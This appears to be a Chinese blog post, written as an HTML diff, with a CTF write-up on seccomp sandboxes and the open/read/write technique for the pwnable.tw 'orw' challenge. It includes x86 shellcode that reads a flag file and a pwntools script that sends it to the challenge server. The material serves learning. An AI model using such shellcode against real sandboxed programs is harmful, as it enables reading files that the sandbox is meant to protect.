@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Seccomp Sandbox (ORW) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        freebuf公开课pwn第五课总结。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Seccomp Sandbox (ORW)">
+<meta property="og:url" content="http://example.com/2020/07/07/sandbox/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        freebuf公开课pwn第五课总结。">
+<meta property="og:locale">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYTSns.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYT97q.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYovcQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYoxXj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYTpBn.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/07/13/UYTPA0.png">
+<meta property="article:published_time" content="2020-07-07T13:14:08.000Z">
+<meta property="article:modified_time" content="2020-07-14T02:45:21.237Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/07/13/UYTSns.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-sandbox" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/07/sandbox/" class="article-date">
+  <time class="post-time" datetime="2020-07-07T13:14:08.000Z" itemprop="datePublished">
+    <span class="post-month">7月</span><br/>
+    <span class="post-day">07</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Seccomp Sandbox (ORW)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        freebuf公开课pwn第五课总结。<span id="more"></span></p>
+<h2 id="0x00-沙箱"><a href="#0x00-沙箱" class="headerlink" title="0x00 . 沙箱"></a>0x00 . 沙箱</h2><p>​        沙箱是一个虚拟系统程序，沙箱提供的环境相对于每一个运行的程序都是独立的，而且不会对现有的系统产生影响，即沙箱提供一个限制该应用程序对系统资源的访问权限。如果程序调用了沙箱函数，也就是说后面执行的代码都会在这个沙箱中进行。而沙箱会限制许多<strong>库函数</strong>导致其无法使用。所以如果要getshell，要么仅利用当前沙箱允许的程序进行getshell，要么进行<strong>沙箱逃逸</strong>(一般指的是python沙箱逃逸)。具体方式需要结合实际的环境和情况。</p>
+<h2 id="0x01-ORW"><a href="#0x01-ORW" class="headerlink" title="0x01 . ORW"></a>0x01 . ORW</h2><p>​        orw指的是三个最基本的库函数，open，read，write。很多时候题目会要求我们仅用这三个函数实现getshell。大致程序流程为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(<span class="string">&quot;/home/test/flag&quot;</span>);		<span class="comment">//用open函数打开flag文件并获取索引</span></span><br><span class="line">read(fd,buf,<span class="number">0x100</span>);				   <span class="comment">//将文件中的文本通过read函数输入到buf中</span></span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">0x100</span>);				   <span class="comment">//用write函数输出buf</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-orw-From-pwnable-tw"><a href="#0x02-orw-From-pwnable-tw" class="headerlink" title="0x02 . orw From pwnable.tw"></a>0x02 . orw From pwnable.tw</h2><p>​        在pwnable.tw上找了一个沙箱例题。</p>
+<h3 id="1-Analysis"><a href="#1-Analysis" class="headerlink" title="1.Analysis"></a>1.Analysis</h3><p>​        例行公事1：</p>
+<p><img src="https://s1.ax1x.com/2020/07/13/UYTSns.png" alt="image-20200703163831579"></p>
+<p>​        例行公事2：</p>
+<p><img src="https://s1.ax1x.com/2020/07/13/UYT97q.png" alt="image-20200703163855847"></p>
+<p>​        例行公事3：</p>
+<p><img src="https://s1.ax1x.com/2020/07/13/UYovcQ.png" alt="image-20200703163932658"></p>
+<p>​        运行之后是segment fault。</p>
+<img src="https://s1.ax1x.com/2020/07/13/UYoxXj.png" alt="image-20200703150532100" style="zoom:90%;" />
+
+<p>​        在ida32上可以看到main函数十分简短，而且发现了大大的orw_seccomp()，可以确定程序存在沙箱没跑了。</p>
+<p>​        而沙箱函数后面的程序，大意就是输入shellcode并用函数指针执行。但是因为存在沙箱，所以当然不能直接执行system(“/bin/sh”)。先用<strong>seccomp-tools</strong>来看看程序沙箱的限制。</p>
+<img src="https://s1.ax1x.com/2020/07/13/UYTpBn.png" style="zoom:70%;" />
+
+<p>​        程序中orw的三个函数都是可以调用的。因此需要通过这三个函数写shellcode。</p>
+<h3 id="2-Shellcode"><a href="#2-Shellcode" class="headerlink" title="2.Shellcode"></a>2.Shellcode</h3><p>​        我们已经知道了只运用orw三个函数如何获取flag，现在只需要把整个流程写成汇编的shellcode即可。</p>
+<p>​        除此之外还需要查一下系统调用函数需要用到那些寄存器，及其分别有哪些作用：</p>
+<img src="https://s1.ax1x.com/2020/07/13/UYTPA0.png" style="zoom:60%;" />
+
+<h3 id="a-fd-open-“-home-orw-flag”"><a href="#a-fd-open-“-home-orw-flag”" class="headerlink" title="a . fd = open(“/home/orw/flag”)"></a>a . fd = open(“/home/orw/flag”)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span> eax,eax;<span class="keyword">xor</span> ebx,ebx;	<span class="comment">//初始化</span></span><br><span class="line"><span class="keyword">xor</span> ecx,ecx;<span class="keyword">xor</span> edx,edx;</span><br><span class="line">mov eax,<span class="number">0x5</span>;				<span class="comment">//open的系统调用码为0x5</span></span><br><span class="line">push <span class="number">0x00006761</span>;			<span class="comment">//flag路径，需要补0</span></span><br><span class="line">push <span class="number">0x6c662f77</span>;			<span class="comment">//逆序</span></span><br><span class="line">push <span class="number">0x726f2f65</span>;			<span class="comment">//压栈暂存</span></span><br><span class="line">push <span class="number">0x6d6f682f</span>;			</span><br><span class="line">mov ebx,esp;				<span class="comment">//路径保存至ebx</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="b-read-fd-buf-0x30"><a href="#b-read-fd-buf-0x30" class="headerlink" title="b . read(fd,buf,0x30);"></a>b . read(fd,buf,0x30);</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov ebx,eax;				<span class="comment">//上一函数后，eax已获得fd</span></span><br><span class="line">mov ecx,esp;				<span class="comment">//将路径的flag文件read到栈上</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;				<span class="comment">//读取字节数为0x30</span></span><br><span class="line">mov eax,<span class="number">0x03</span>;				<span class="comment">//read的系统调用码为0x3</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="c-write-1-buf-0x30"><a href="#c-write-1-buf-0x30" class="headerlink" title="c.write(1,buf,0x30)"></a>c.write(1,buf,0x30)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax,<span class="number">0x4</span>;				<span class="comment">//write的系统调用码为0x4</span></span><br><span class="line">mov ebx,<span class="number">0x1</span>;				<span class="comment">//fd = stdout</span></span><br><span class="line">mov ecx,ecx;				<span class="comment">//要输出的flag在栈上，但是ecx已经指向esp了，因此本步可以不写</span></span><br><span class="line">mov edx,<span class="number">0x30</span>;				<span class="comment">//输出字节数为0x30</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-Exploit"><a href="#3-Exploit" class="headerlink" title="3.Exploit"></a>3.Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./orw&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10001</span>)</span><br><span class="line">_<span class="built_in">open</span> = <span class="string">&quot;xor eax,eax;xor ebx,ebx;xor ecx,ecx;xor edx,edx;push 0x00006761;push 0x6c662f77;push 0x726f2f65;push 0x6d6f682f;mov ebx,esp;mov eax,0x5;int 0x80;&quot;</span></span><br><span class="line">_read = <span class="string">&quot;mov ebx,eax;mov ecx,esp;mov edx,0x30;mov eax,0x3;int 0x80;&quot;</span></span><br><span class="line">_write = <span class="string">&quot;mov ebx,0x1;mov ecx,esp;mov edx,0x30;mov eax,0x4;int 0x80;&quot;</span></span><br><span class="line">payload = _<span class="built_in">open</span>+_read+_write</span><br><span class="line">payload = asm(payload)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span> p.recv(<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/07/07/sandbox/" data-id="ckmlis0za000es0lj64am39zk" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/13/2020%205space/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          5space (of-twice复现)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/13/guess/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2018网鼎pwn (guess复现)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
